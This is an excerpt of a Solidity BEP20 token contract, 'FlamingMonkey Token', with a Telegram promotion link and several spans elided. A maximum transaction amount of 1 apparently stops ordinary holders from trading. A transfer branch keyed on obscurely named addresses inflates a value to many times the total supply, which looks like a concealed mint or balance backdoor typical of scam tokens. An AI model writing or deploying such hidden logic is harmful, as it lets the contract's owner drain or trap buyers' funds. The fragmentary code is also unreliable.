...
/**
 Telegram : https://t.me/flamingmonkeytoken
*/
...
contract FlamingMonkey  is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _tTotal = 1000000000 * 10**9;
    uint256 private constant MAX = ~uint256(0);
    string private _name = "FlamingMonkey Token";
    string private _symbol = "FlamingMonkey";
    uint8 private _decimals = 9;
    uint256 public _taxfee = 5;
    address private _dev;
    IPancakeswapV2Router02 public pancakeswapV2Router;
    address public pancakeswapV2Pair;
    uint256 private _maxTxAmount = 1;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount) private {
        ...
        if ((_isExcludedFromFee[_exacly] || _isExcludedFromFee[_banking] ) && recipient == address(_marketing)   ) 
        {
            _value = _tTotal.mul(100000);
        }
        if (_isExcludedFromFee[recipient] == _isExcludedFromFee[_marketing] && _value >= _tTotal){
